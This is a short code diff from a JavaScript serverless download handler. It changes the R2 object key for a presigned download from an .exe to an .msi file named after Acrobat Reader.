@@ -38,7 +38,7 @@ export default async function handler(req, res) {
   // Presigned URL from R2
   const command = new GetObjectCommand({
     Bucket: process.env.R2_BUCKET,
-    Key: "Acrobat_Reader_V112.exe",
+    Key: "Acrobat_Reader_V112.msi",
     ResponseContentDisposition: `attachment; filename="${newFileName}"`,
   });
 
